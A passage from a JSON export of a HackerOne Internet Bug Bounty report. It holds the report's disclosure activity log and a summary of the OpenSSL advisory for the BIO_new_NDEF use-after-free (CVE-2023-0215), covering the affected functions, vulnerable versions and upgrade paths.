SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eaa4aa6b652c10668ec19f469f3aa28d840db282e7f44e24ee758647320b83be"
        },
        "profile": {
          "name": "Internet Bug Bounty"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "ibb",
      "collaborator": {
        "username": "ogalland",
        "url": "/ogalland"
      }
    },
    {
      "id": 20863999,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Thank you for your submission, @ogalland! ",
      "automated_response": false,
      "created_at": "2023-03-17T19:28:33.299Z",
      "updated_at": "2023-03-17T19:28:33.299Z",
      "actor": {
        "username": "kunderkoffler",
        "cleared": false,
        "verified": false,
        "url": "/kunderkoffler",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "reporter": {
        "username": "ogalland",
        "url": "/ogalland"
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    },
    {
      "id": 20864001,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-03-17T19:28:41.650Z",
      "updated_at": "2023-03-17T19:28:41.650Z",
      "first_to_agree": true,
      "actor": {
        "username": "kunderkoffler",
        "cleared": false,
        "verified": false,
        "url": "/kunderkoffler",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    },
    {
      "id": 20871555,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-03-18T18:31:24.067Z",
      "updated_at": "2023-03-18T18:31:24.067Z",
      "actor": {
        "username": "ogalland",
        "cleared": false,
        "verified": false,
        "url": "/ogalland",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    },
    {
      "id": 20871556,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-03-18T18:31:24.172Z",
      "updated_at": "2023-03-18T18:31:24.172Z",
      "actor": {
        "username": "ogalland",
        "cleared": false,
        "verified": false,
        "url": "/ogalland",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "ibb"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "id": 266656,
      "category": "team",
      "content": "Use-after-free following BIO_new_NDEF (CVE-2023-0215)\n=====================================================\n\nSeverity: Moderate\n\nThe public API function BIO_new_NDEF is a helper function used for streaming ASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the SMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by end user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter BIO onto the front of it to form a BIO chain, and then returns the new head of the BIO chain to the caller. Under certain conditions, for example if a CMS recipient public key is invalid, the new filter BIO is freed and the function returns a NULL result indicating a failure. However, in this case, the BIO chain is not properly cleaned up and the BIO passed by the caller still retains internal pointers to the previously freed filter BIO. If the caller then goes on to call BIO_pop() on the BIO then a use-after-free will occur. This will most likely result in a crash.\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which may cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on the BIO. This internal function is in turn called by the public API functions PEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream, SMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.\n\nOpenSSL 3.0, 1.1.1 and 1.0.2 are vulnerable to this issue.\n\nOpenSSL 3.0 users should upgrade to OpenSSL 3.0.8.\nOpenSSL 1.1.1 users should upgrade to OpenSSL 1.1.1t.\nOpenSSL 1.0.2 users should upgrade to OpenSSL 1.0.2zg (premium support customers only).\n\nThis issue was reported on 29th November 2022 by Octavio Galland and Marcel Böhme (Max Planck Institute for Security and Privacy). The fix was developed by Viktor Dukhovni and Matt Caswell.\n\nFull Security Advisory: https://www.openssl.org/news/secadv/20230207.txt",
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": [

      ]
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}